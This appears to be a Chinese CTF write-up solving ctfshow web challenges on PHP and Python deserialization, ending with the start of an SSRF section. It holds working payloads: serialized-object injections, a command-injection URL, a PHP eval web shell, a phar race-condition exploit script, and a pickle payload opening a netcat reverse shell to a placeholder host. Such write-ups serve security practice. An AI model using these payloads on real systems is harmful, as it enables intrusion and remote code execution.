<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;
    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));
    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;</code></pre>
<p>所以这边构造一下在访问message.php就可以过了</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;1&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;2&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    &#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">message</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></code></pre>
<p>这边后边是27个字符，那就要27个多出来的字符来保证后面的字符逃逸掉，刚好替换后每个多1位，那么就构造27个<code>fuck</code>就可</p>
<pre><code class="highlight plaintext">f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
<p>常规的打完看看能不能直接打<code>message.php</code>，毕竟就传个cookie的事情</p>
<p>拿到原Cookie<code>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></p>
<p>直接改</p>
<pre><code class="highlight plaintext">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
<p>base64加密后得到</p>
<pre><code class="highlight plaintext">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiYSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIyIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></pre>
<p>直接传也可以得到flag</p>
<h3 id="web263"><a class="markdownIt-Anchor" href="#web263"></a> web263</h3>
<p>进来是一个登录界面，懵了一下，果断请他吃我一扫</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250717163049318.png" alt="image-20250717163049318"></p>
<h3 id="web264"><a class="markdownIt-Anchor" href="#web264"></a> web264</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span>
<span class="comment"># <span class="doctag">@message</span>.php</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">session_start</span>();

<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];
<span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];
<span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;
    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);
    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));
    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);
    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
<p>怎么感觉，似曾相识啊。</p>
<p>但是把之前那题能直接改msg的非预期修掉了。</p>
<p>所以直接用上上题的poc</p>
<p>但是由于它不自带msg,你需要抓包改一下Cookie加一个msg,什么值随意</p>
<h3 id="web265"><a class="markdownIt-Anchor" href="#web265"></a> web265</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>

<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$token</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;
    &#125;
&#125;

<span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);
<span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());

<span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;
    <span class="keyword">echo</span> <span class="variable">$flag</span>;
&#125;</code></pre>
<p>感觉是一个md5绕过，马上想起来<strong>Error/Exception</strong>原生类是可以绕过哈希的，但是这里用不到</p>
<p>仔细想想，要token和password相等，这里必须要token动password也动</p>
<p>那么用&amp;试一下行不行</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="number">1</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();
<span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>
<p>直接就得到flag了</p>
<h3 id="web266"><a class="markdownIt-Anchor" href="#web266"></a> web266</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);


<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">global</span> <span class="variable">$flag</span>;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;
<span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);
<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;
    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);
&#125;</code></pre>
<p>这里只要不抛错就能得到正常的结果</p>
<p>这边正则没有用模糊匹配(i)的模式，直接大小写绕过即可</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;1&quot;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;2&quot;</span>;
&#125;
<span class="variable">$ctfshowo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfshowo</span>);
<span class="comment">//把结果的ctfshow任意改一个字母为大写即可</span></code></pre>
<p>并且这边即使什么都不写也是可以的，必定会<code>__destruct</code>，利用PHP<strong>函数名和类名不区分大小写，变量名区分</strong>的特性</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;
&#125;

<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">Ctfshow</span>();

<span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));

<span class="meta">?&gt;</span></code></pre>
<h3 id="web267"><a class="markdownIt-Anchor" href="#web267"></a> web267</h3>
<h3 id="web275"><a class="markdownIt-Anchor" href="#web275"></a> web275</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span>;
    <span class="keyword">public</span> <span class="variable">$filecontent</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;
            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);
        &#125;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;
    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);
    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);
    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);
        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);
        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);
        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
&#125;</code></pre>
<p>感觉是拼接字符串命令执行</p>
<p><strong>POC1</strong></p>
<pre><code class="highlight plaintext">/?fn=;tac flag.php</code></pre>
<p>做完看源码在思考,能不能写一个马进去呢。。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//filename=1.pthml</span></code></pre>
<p>但是最后没写进去，用命令拼接发现是有文件写入权限的，不懂了</p>
<p>然后发现自己犯了个很弱智的错误</p>
<p>这个马还没访问就被删除拿头执行啊。。</p>
<h3 id="web276"><a class="markdownIt-Anchor" href="#web276"></a> web276</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span>;
    <span class="keyword">public</span> <span class="variable">$filecontent</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;
    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;
            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);
        &#125;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;
    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);
    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);
    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);
        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);
        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);
        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
&#125;</code></pre>
<p>增加了一个<code>admin</code>的认证</p>
<p>并且这里你拿这个admin没办法的。。</p>
<p>思路是phar反序列化，但是由于源码会删除文件，那么就要用条件竞争来玩一玩了。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span>
<span class="class"></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;
    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;
&#125;

<span class="comment">// 后缀必须为phar</span>
<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;evil.phar&quot;</span>);
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();
<span class="comment">// 设置 stubb, 增加 gif 文件头</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);
<span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();
<span class="comment">/**</span>
<span class="comment"> * 将自定义的 meta-data 存入 manifest</span>
<span class="comment"> * 这个函数需要在php.ini中修改 phar.readonly 为 Off</span>
<span class="comment"> * 否则的话会抛出 </span>
<span class="comment"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span>
<span class="comment"> * 异常.</span>
<span class="comment"> */</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);
<span class="comment">// 添加需压缩的文件</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();

<span class="meta">?&gt;</span></code></pre>
<pre><code class="highlight python"><span class="comment">#encoding=gbk</span>
<span class="keyword">import</span> threading
<span class="keyword">import</span> requests
<span class="keyword">import</span> urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = <span class="string">&quot;https://3769cb08-d5ff-4f8a-8fda-5eff7c9d5c41.challenge.ctf.show/&quot;</span>
data = <span class="built_in">open</span>(<span class="string">&#x27;./evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()
flag = <span class="literal">True</span>
<span class="keyword">def</span> <span class="title function_">write</span>():
    requests.post(url+<span class="string">&#x27;?fn=evil.phar&#x27;</span>, data=data,verify=<span class="literal">False</span>)
<span class="keyword">def</span> <span class="title function_">unserialize</span>():
    <span class="keyword">global</span> flag
    r = requests.get(url+<span class="string">&#x27;?fn=phar://evil.phar&#x27;</span>,verify=<span class="literal">False</span>)
    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag:
        <span class="built_in">print</span>(r.text)
        flag = <span class="literal">False</span>
<span class="keyword">while</span> flag:
    threading.Thread(target = write).start()
    threading.Thread(target = unserialize).start()</code></pre>
<p>脚本是[这位师傅](<a href="https://blog.csdn.net/Myon5/article/details/143657655">ctfshow-web入门-反序列化（web271-web278）_ctfshow web271-CSDN博客</a>)的！</p>
<p>这里跑了半天才跑出来</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250723174915266.png" alt="image-20250723174915266"></p>
<h3 id="web277"><a class="markdownIt-Anchor" href="#web277"></a> web277</h3>
<p>看看源码注释</p>
<pre><code class="highlight html"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></code></pre>
<p>pickle反序列化来的</p>
<p>简单到不行的pickle</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> base64
<span class="keyword">class</span> <span class="title class_">a</span>:
	<span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
		<span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxxx -e /bin/sh&#x27;).read()&quot;</span>,))
obj = a()
code=pickle.dumps(obj)
<span class="built_in">print</span>(base64.b64encode(code))</code></pre>
<p>直接弹shell，flag就在根目录下(问就是无回显)</p>
<h3 id="web278"><a class="markdownIt-Anchor" href="#web278"></a> web278</h3>
<p>题目提示过滤了os.system</p>
<p>然鹅这和我们并没有任何关系</p>
<p>继续弹</p>
<h2 id="ssrfcomplete"><a class="markdownIt-Anchor" href="#ssrfcomplete"></a> SSRF(Complete)</h2>
<h3 id="web351"><a class="markdownIt-Anchor" href="#web351"></a> web351</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>
<p>直接访问提示非本地用户禁止访问，既然是SSRF那就是在URL里输入<code>127.0.0.1/flag.php</code></p>
<h3 id="web352"><a class="markdownIt-Anchor" href="#web352"></a> web352</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
